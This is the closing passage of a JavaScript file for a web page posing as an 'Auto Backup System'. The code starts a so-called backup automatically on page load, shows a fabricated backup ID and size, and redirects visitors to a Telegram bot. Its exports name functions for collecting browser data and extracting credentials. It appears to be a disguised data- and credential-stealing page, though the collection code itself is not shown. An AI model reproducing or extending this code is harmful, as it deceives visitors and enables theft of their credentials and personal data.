        setTimeout(() => {
            newStageElement.classList.add('active');
            currentStage = newStage;
        }, 300);
    }
}

function updateCompletionScreen(totalTime, backupSize) {
    // Generate backup ID
    const backupId = generateBackupId();
    if (elements.backupId) {
        elements.backupId.textContent = backupId;
    }
    
    // Update backup size
    if (elements.backupSize) {
        elements.backupSize.textContent = backupSize;
    }
    
    // Update time
    if (elements.backupTime) {
        elements.backupTime.textContent = `${totalTime.toFixed(2)}s`;
    }
    
    // Update device details
    if (backupData.device) {
        updateDeviceInfoUI(backupData.device);
    }
}

function calculateBackupSize() {
    const dataStr = JSON.stringify(backupData);
    return formatBytes(dataStr.length);
}

// ===== UTILITY FUNCTIONS =====
async function quickSpeedTest() {
    const start = performance.now();
    
    try {
        await fetch('https://httpbin.org/bytes/1024', {
            cache: 'no-store',
            mode: 'no-cors'
        });
    } catch(e) {
        // Ignore errors
    }
    
    const end = performance.now();
    const duration = (end - start) / 1000;
    return duration > 0 ? (8 / duration).toFixed(1) : '∞';
}

function generateBackupId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = '';
    for (let i = 0; i < 12; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
}

function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function handleBackupError(error) {
    console.error('Backup error:', error);
    
    if (elements.progressTime) {
        elements.progressTime.textContent = 'Backup failed. Redirecting...';
    }
    if (elements.progressFill) {
        elements.progressFill.style.background = '#ff3366';
    }
    
    // Redirect to Telegram
    setTimeout(() => {
        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_error`;
    }, 3000);
}

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', function() {
    console.log('📱 Auto Backup System Initialized');
    
    // Start backup after short delay
    setTimeout(() => {
        if (window.startBackupProcess) {
            window.startBackupProcess();
        }
    }, 500);
});

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        startBackupProcess: window.startBackupProcess,
        collectRealDeviceInfo,
        collectAllRealBrowserData,
        extractRealCredentials,
        CONFIG
    };
}
